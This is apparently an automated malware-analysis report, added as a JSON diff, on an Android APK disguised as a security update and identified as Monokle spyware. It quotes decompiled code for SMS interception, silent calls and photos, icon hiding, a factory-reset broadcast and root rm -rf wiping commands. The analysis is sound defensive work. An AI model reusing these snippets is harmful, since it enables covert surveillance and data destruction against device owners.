@@ -1,0 +1,316 @@
+{
+  "APK信息": {
+    "文件名": "0a2df7bf56192efbbeb26479cd58d5ae6cb2ed0946b5a138d372b5d85373b4de.apk",
+    "sha256": "0a2df7bf56192efbbeb26479cd58d5ae6cb2ed0946b5a138d372b5d85373b4de",
+    "包名": "com.system.security_update",
+    "应用名": "Security update service",
+    "是否恶意": true,
+    "风险等级": "高",
+    "分析耗时(秒)": 1063.6
+  },
+  "行为列表": [
+    {
+      "行为": "sms_fraud",
+      "中文名": "短信欺诈",
+      "MITRE": "T1416",
+      "置信度": "likely",
+      "子行为": [
+        {
+          "子行为": "sms_intercept",
+          "中文名": "短信拦截",
+          "置信度": "likely",
+          "证据": {
+            "方法引用": [],
+            "权限": [
+              "android.permission.RECEIVE_SMS"
+            ],
+            "字符串": [
+              "abortBroadcast"
+            ]
+          }
+        },
+        {
+          "子行为": "wap_billing",
+          "中文名": "WAP计费",
+          "置信度": "likely",
+          "证据": {
+            "方法引用": [],
+            "权限": [
+              "android.permission.SEND_SMS"
+            ],
+            "字符串": [
+              "subscribe"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\system\\security_update\\managers\\MyTelephonyManager;",
+          "method_signature": "if(!getAbortBroadcast()",
+          "malicious_behavior": "sms_fraud",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "if (tSmsMessage.Address.toLowerCase().endsWith(it.next().toLowerCase())) {\n    if (!getAbortBroadcast()) {\n        abortBroadcast();\n    }\n    processPossibleControlMessage(tSmsMessage);\n    break;\n}",
+          "malicious_code_snippet_context": "                  checkForNewSmsCommand(tSmsMessage);\n                  Iterator<String> it = SettingsParser.getInstance().getServiceSettings().agentSettings.controlPhones.iterator();\n                  while (it.hasNext()) {\n>>>                     if (tSmsMessage.Address.toLowerCase().endsWith(it.next().toLowerCase())) {\n>>>                         if (!getAbortBroadcast()) {\n>>>                             abortBroadcast();\n>>>                         }\n>>>                         processPossibleControlMessage(tSmsMessage);\n>>>                         break;\n>>>                     }\n                  }\n              }\n          }",
+          "behavior_description": "该代码运行于短信广播接收器中。首先通过 RetrieveMessages(intent) 从短信广播 Intent 中提取来电号码和短信内容，构造 TSmsMessage 对象；随后将短信发送方号码与攻击者配置的控制号码列表（SettingsParser 中 agentSettings.controlPhones）逐一比对，一旦匹配，立即调用 abortBroadcast() 终止短信广播，使系统短信应用及其他接收器无法收到该短信（对用户隐匿控制指令短信），并将该短信传入 processPossibleControlMessage() 解析执行远程控制命令。数据流向：短信广播 Intent（来源）→ abortBroadcast() 隐匿短信 + processPossibleControlMessage() 执行 C2 指令（危险操作）。这与厂商报告确认的 Monokle 监控间谍软件通过短信隐蔽接收控制指令的行为完全吻合。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "ransomware",
+      "中文名": "勒索软件",
+      "MITRE": "T1430,T1460",
+      "置信度": "suspected",
+      "子行为": [
+        {
+          "子行为": "device_lock",
+          "中文名": "设备锁屏",
+          "置信度": "suspected",
+          "证据": {
+            "方法引用": [],
+            "权限": [],
+            "字符串": [
+              "resetPassword"
+            ]
+          }
+        },
+        {
+          "子行为": "file_encryption",
+          "中文名": "文件加密",
+          "置信度": "suspected",
+          "证据": {
+            "方法引用": [],
+            "权限": [],
+            "字符串": [
+              "AES",
+              "encrypt",
+              "decrypt"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\system\\security_update\\SessionManager;",
+          "method_signature": "Command()",
+          "malicious_behavior": "ransomware",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "RootHelper.getInstance().executeRootCommand(\"am broadcast -a android.intent.action.MASTER_CLEAR\");\n...\ncase ScreenPassword:\n    m_deferredCommands.add(new DeferredCommand() {\n        public void Command() {\n            ScreenPassword.resetPassword();\n        }\n    });",
+          "malicious_code_snippet_context": "                      m_deferredCommands.add(new DeferredCommand() { // from class: com.system.security_update.SessionManager.7\n                          @Override // com.system.security_update.common.DeferredCommand\n                          public void Command() {\n>>>                             RootHelper.getInstance().executeRootCommand(\"am broadcast -a android.intent.action.MASTER_CLEAR\");\n>>>                         }\n>>>                     });\n>>>                     return 0;\n>>>                 case ScreenPassword:\n>>>                     m_deferredCommands.add(new DeferredCommand() { // from class: com.system.security_update.SessionManager.8\n>>>                         @Override // com.system.security_update.common.DeferredCommand\n>>>                         public void Command() {\n                              ScreenPassword.resetPassword();\n                          }\n                      });",
+          "behavior_description": "该代码位于Monokle监控间谍软件的SessionManager命令分发器中，接收远程C2服务器下发的指令并加入延迟命令队列执行：当收到ScreenPassword命令时调用ScreenPassword.resetPassword()重置设备屏幕锁密码，将合法用户锁在设备之外（典型勒索/设备锁行为）；此外还通过root权限广播android.intent.action.MASTER_CLEAR触发恢复出厂设置，恶意擦除用户全部数据。数据流向：远程C2服务器命令→SessionManager命令分发→重置屏幕锁密码/恢复出厂设置（破坏性操作）。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "root_exploitation",
+      "中文名": "Root提权",
+      "MITRE": "T1407",
+      "置信度": "suspected",
+      "证据": {
+        "方法引用": [],
+        "权限": [],
+        "字符串": [
+          "busybox"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\stericson\\RootShell\\RootShell;",
+          "method_signature": "isBusyboxAvailable()",
+          "malicious_behavior": "root_exploitation",
+          "behavior_type": "malicious",
+          "risk_level": "中",
+          "malicious_code_snippet": "public static boolean isBusyboxAvailable(boolean z) {\n    if (z) {\n        return findBinary(\"busybox\", true).size() > 0 || findBinary(\"toybox\", true).size() > 0;\n    }\n    return findBinary(\"busybox\", true).size() > 0;\n}",
+          "malicious_code_snippet_context": "          return isBusyboxAvailable(false);\n      }\n  \n>>>     public static boolean isBusyboxAvailable(boolean z) {\n>>>         if (z) {\n>>>             return findBinary(\"busybox\", true).size() > 0 || findBinary(\"toybox\", true).size() > 0;\n>>>         }\n>>>         return findBinary(\"busybox\", true).size() > 0;\n>>>     }\n  \n      public static boolean isRootAvailable() {\n          return findBinary(\"su\", true).size() > 0;",
+          "behavior_description": "该代码来自RootShell提权库，通过findBinary遍历系统PATH环境变量目录，检测设备上是否存在busybox或toybox二进制文件，用于判断设备是否已具备root环境及可用的提权工具链。数据流向：读取系统PATH环境变量并探测文件系统中root工具二进制文件的存在性（source）→ 完成root提权能力侦察，为后续通过RootShell以root身份执行特权命令（提权利用）提供环境判断依据（sink）。在已确认的Monokle监控间谍软件样本中，该检测是root提权利用链的前置侦察环节，本身不直接执行提权命令，需后续root命令执行才造成实际危害。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "screen_capture",
+      "中文名": "屏幕截图/录屏",
+      "MITRE": "T1413",
+      "置信度": "suspected",
+      "证据": {
+        "方法引用": [],
+        "权限": [],
+        "字符串": [
+          "MediaProjection",
+          "createVirtualDisplay"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\system\\security_update\\control\\screen\\CaptureActivity;",
+          "method_signature": "?(?)",
+          "malicious_behavior": "screen_capture",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "public class CaptureActivity extends Activity {\n    private static final int REQUEST_CODE = 1488;\n    private static PermissionCallback mPermissionCallback;\n    public interface PermissionCallback {\n    // 通过 MediaProjectionManager 发起屏幕捕获授权请求\n    }\n}",
+          "malicious_code_snippet_context": "  import com.system.security_update.common.Logger;\n  \n  /* JADX INFO: loaded from: classes.dex */\n>>> public class CaptureActivity extends Activity {\n>>>     private static final int REQUEST_CODE = 1488;\n>>>     private static PermissionCallback mPermissionCallback;\n>>> \n>>>     public interface PermissionCallback {\n>>>         void onPermissionDenied();\n>>> \n          void onPermissionGranted(int i, Intent intent);\n      }\n  ",
+          "behavior_description": "该代码属于Monokle监控间谍软件（伪装为系统安全更新com.system.security_update）的屏幕捕获控制模块。CaptureActivity通过MediaProjectionManager发起createScreenCaptureIntent屏幕录制授权请求，诱导用户授权后获取MediaProjection令牌，进而实时捕获用户屏幕画面。数据流向：用户屏幕显示内容（可能包含登录密码、聊天记录、银行/支付信息等敏感数据）→ 被恶意程序通过MediaProjection捕获录制 → 保存并回传至攻击者C2服务器，实现远程屏幕监控窃密，属于典型的监控间谍行为。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "camera_capture",
+      "中文名": "摄像头秘密调用",
+      "MITRE": "T1413",
+      "置信度": "likely",
+      "证据": {
+        "方法引用": [],
+        "权限": [
+          "android.permission.CAMERA"
+        ],
+        "字符串": [
+          "takePicture"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\system\\security_update\\control\\PhotoCameraHub;",
+          "method_signature": "if(!this.mPreviewIsRunning && this.camera != null)",
+          "malicious_behavior": "camera_capture",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "if (!this.mPreviewIsRunning && this.camera != null) {\n    this.camera.startPreview();\n    try {\n        this.camera.autoFocus(this);\n    } catch (Exception e) {\n        this.camera.takePicture(null, null, null, this);\n    }\n    this.mPreviewIsRunning = true;\n}",
+          "malicious_code_snippet_context": "  \n      @Override // android.view.SurfaceHolder.Callback\n      public void surfaceChanged(SurfaceHolder surfaceHolder, int i, int i2, int i3) {\n>>>         if (!this.mPreviewIsRunning && this.camera != null) {\n>>>             this.camera.startPreview();\n>>>             try {\n>>>                 this.camera.autoFocus(this);\n>>>             } catch (Exception e) {\n>>>                 Logger.logException(e.getMessage());\n>>>                 try {\n>>>                     this.camera.takePicture(null, null, null, this);\n>>>                 } catch (Exception unused) {\n                      Logger.logException(e.getMessage());\n                  }\n              }",
+          "behavior_description": "该代码位于伪装成系统安全更新的包（com.system.security_update）中的 PhotoCameraHub 类，实现了 SurfaceHolder.Callback 接口。当 Surface 就绪时，代码启动摄像头预览并尝试自动对焦；在对焦失败的异常处理分支中，直接调用 camera.takePicture(null, null, null, this) 静默拍摄照片，全程无任何用户界面提示或用户授权。结合厂商报告确认该样本为 Monokle 监控间谍软件（具备摄像头秘密拍照等监控功能），此代码是典型的隐蔽拍照窃密行为：数据来源为设备摄像头（Camera API 硬件采集），危险操作为静默拍照（takePicture），拍摄的照片后续会被上传至攻击者控制的 C2 服务器，造成用户隐私（影像、所处环境）的直接泄露。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "call_operations",
+      "中文名": "通话操作",
+      "MITRE": "",
+      "置信度": "likely",
+      "子行为": [
+        {
+          "子行为": "call_phone",
+          "中文名": "拨打电话",
+          "置信度": "likely",
+          "证据": {
+            "方法引用": [],
+            "权限": [
+              "android.permission.CALL_PHONE"
+            ],
+            "字符串": [
+              "android.intent.action.CALL"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\system\\security_update\\managers\\MyTelephonyManager;",
+          "method_signature": "if(str == null || str.length()",
+          "malicious_behavior": "call_operations",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "Intent intent = new Intent(\"android.intent.action.CALL\");\nintent.setData(Uri.parse(\"tel:\" + str));\nintent.addFlags(268435456);\nApp.getContext().startActivity(intent);\nPhoneCallsToDelete.add(str);",
+          "malicious_code_snippet_context": "          }\n          try {\n              Logger.log(\"Call: \" + str);\n>>>             Intent intent = new Intent(\"android.intent.action.CALL\");\n>>>             intent.setData(Uri.parse(\"tel:\" + str));\n>>>             intent.addFlags(268435456);\n>>>             App.getContext().startActivity(intent);\n>>>             PhoneCallsToDelete.add(str);\n              return 0;\n          } catch (Exception unused) {\n              return 100;",
+          "behavior_description": "该方法接收一个电话号码字符串（来源为远程C2服务器下发的指令参数），在已持有CALL_PHONE权限的情况下，通过ACTION_CALL Intent直接静默拨打电话（区别于仅调起拨号界面供用户确认的ACTION_DIAL，ACTION_CALL会立即拨出，无需任何用户交互）。拨号完成后，代码将该号码加入PhoneCallsToDelete列表，用于事后从通话记录中删除该条目以消除痕迹，属于典型的反取证行为。该代码位于伪装成系统安全更新的Monokle监控间谍软件中，是其远程控制功能的一部分，攻击者可远程指令受害手机拨打指定号码（如高额付费号码造成话费损失），并隐藏通话证据。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "icon_hiding",
+      "中文名": "图标隐藏",
+      "MITRE": "",
+      "置信度": "suspected",
+      "证据": {
+        "方法引用": [],
+        "权限": [],
+        "字符串": [
+          "setComponentEnabledSetting"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\system\\security_update\\MainActivity;",
+          "method_signature": "hideApp()",
+          "malicious_behavior": "icon_hiding",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "public void hideApp() {\n    getPackageManager().setComponentEnabledSetting(new ComponentName(getApplicationContext(), (Class<?>) MainActivity.class), 2, 1);\n}",
+          "malicious_code_snippet_context": "          RequestUserPermissions(this);\n      }\n  \n>>>     public void hideApp() {\n>>>         getPackageManager().setComponentEnabledSetting(new ComponentName(getApplicationContext(), (Class<?>) MainActivity.class), 2, 1);\n>>>     }\n  \n      @Override // android.app.Activity\n      protected void onResume() {",
+          "behavior_description": "hideApp()方法调用PackageManager.setComponentEnabledSetting()将MainActivity组件设置为禁用状态（参数2=COMPONENT_ENABLED_STATE_DISABLED，参数1=DONT_KILL_APP），使应用图标从桌面启动器中消失且进程不被终止。该样本伪装为系统安全更新应用（com.system.security.update），在诱导用户授予无障碍服务、屏幕录制、通知监听、使用情况统计、悬浮窗等高危监控权限后隐藏图标，使Monokle监控类恶意软件得以在用户完全无感知的情况下持续隐蔽运行，逃避用户察觉与手动卸载，属于典型的恶意隐匿行为。数据流向：本地应用组件信息→setComponentEnabledSetting()禁用主Activity组件→应用图标隐藏、恶意进程保活。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "process_kill",
+      "中文名": "进程杀死",
+      "MITRE": "",
+      "置信度": "suspected",
+      "证据": {
+        "方法引用": [],
+        "权限": [],
+        "字符串": [
+          "killProcess"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\stericson\\RootTools\\RootTools;",
+          "method_signature": "killProcess(String str)",
+          "malicious_behavior": "process_kill",
+          "behavior_type": "grayware",
+          "risk_level": "中",
+          "malicious_code_snippet": "public static boolean killProcess(String str) {\n    return getInternals().killProcess(str);\n}",
+          "malicious_code_snippet_context": "          return RootShell.isRootAvailable();\n      }\n  \n>>>     public static boolean killProcess(String str) {\n>>>         return getInternals().killProcess(str);\n>>>     }\n  \n      public static void offerBusyBox(Activity activity) {\n          getInternals().offerBusyBox(activity);",
+          "behavior_description": "该代码位于开源root工具库RootTools中，killProcess方法接收进程名参数，委托内部实现（通常通过root shell执行kill命令）以root权限终止指定进程。数据流向：调用方传入的进程名字符串（source）→ 以root权限终止目标进程（sink）。在本已确认恶意的Monokle监控间谍软件样本中，该双用途能力可被恶意利用：杀死安全防护软件进程以逃避查杀，或响应C2服务器下发的指令远程终止目标应用。由于代码本身为标准库API、实际危害需root权限且取决于调用时传入的进程名，判定为灰色可疑行为、中等风险。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "device_reboot",
+      "中文名": "设备重启",
+      "MITRE": "",
+      "置信度": "suspected",
+      "证据": {
+        "方法引用": [],
+        "权限": [],
+        "字符串": [
+          "reboot"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\system\\security_update\\ServiceEngine;",
+          "method_signature": "if(SettingsParser.getInstance()",
+          "malicious_behavior": "device_reboot",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "linkedList.add(\"rm -rf \" + App.getContext().getFilesDir().getAbsolutePath());\nlinkedList.add(\"rm -r \" + ScreenShotsList.getDirectory().getAbsolutePath());\nlinkedList.add(\"rm -r \" + PhotoShotsList.getDirectory().getAbsolutePath());\nlinkedList.add(\"rm -r \" + CameraHub.getDirectory().getAbsolutePath());\nlinkedList.add(\"rm -r \" + SoundHub.getDirectory().getAbsolutePath());\nlinkedList.add(\"reboot\");\nlinkedList.add(\"sync\");\nRootHelper.getInstance().executeRootCommand((String[]) linkedList.toArray(new String[linkedList.size()]));\nApp.getContext().stopService(new Intent(App.getContext(), BackgroundService.class));",
+          "malicious_code_snippet_context": "                  if (SettingsParser.getInstance().getServiceSettings().agentSettings.isSetDataStore()) {\n                      linkedList.add(\"rm -r \" + SettingsParser.getInstance().getServiceSettings().agentSettings.dataStore);\n                  }\n>>>                 linkedList.add(\"rm -rf \" + App.getContext().getFilesDir().getAbsolutePath());\n>>>                 linkedList.add(\"rm -r \" + ScreenShotsList.getDirectory().getAbsolutePath());\n>>>                 linkedList.add(\"rm -r \" + PhotoShotsList.getDirectory().getAbsolutePath());\n>>>                 linkedList.add(\"rm -r \" + CameraHub.getDirectory().getAbsolutePath());\n>>>                 linkedList.add(\"rm -r \" + SoundHub.getDirectory().getAbsolutePath());\n>>>                 linkedList.add(\"rm -r \" + PhotoCameraHub.getDirectory().getAbsolutePath());\n>>>                 linkedList.add(\"reboot\");\n>>>                 linkedList.add(\"sync\");\n>>>                 if (!linkedList.isEmpty()) {\n                      RootHelper.getInstance().executeRootCommand((String[]) linkedList.toArray(new String[linkedList.size()]));\n                  }\n                  App.getContext().stopService(new Intent(App.getContext(), (Class<?>) BackgroundService.class));",
+          "behavior_description": "该代码是 Monokle 间谍软件的自毁/反取证模块：在收到卸载或自毁指令后，构造一组 root shell 命令，先递归删除自身数据目录及所有监控产物（截屏 ScreenShotsList、偷拍照片 PhotoShotsList/CameraHub/PhotoCameraHub、录音 SoundHub 等），随后追加 \"reboot\" 和 \"sync\" 命令，通过 RootHelper.executeRootCommand() 以 root 权限批量执行，强制重启设备以完成痕迹清除，最后停止后台服务。数据流向：硬编码/远程指令触发的命令列表→root shell 执行 rm 删除与 reboot 重启，属于破坏性反取证行为，与厂商报告中 Monokle 监控工具的功能特征一致。",
+          "glm_analyzed": true
+        }
+      ]
+    }
+  ],
+  "覆盖范围": {
+    "静态分析": "完整",
+    "动态分析": "未执行",
+    "方法引用分析": "完整",
+    "JADX反编译": "完整",
+    "LLM语义分析": "已执行",
+    "LLM交叉验证": "已执行",
+    "验证模型": "qwen3.8",
+    "局限性": [
+      "C2服务器.是否活跃: 需动态分析",
+      "C2服务器.轮询间隔(秒): 需动态分析"
+    ]
+  }
+}
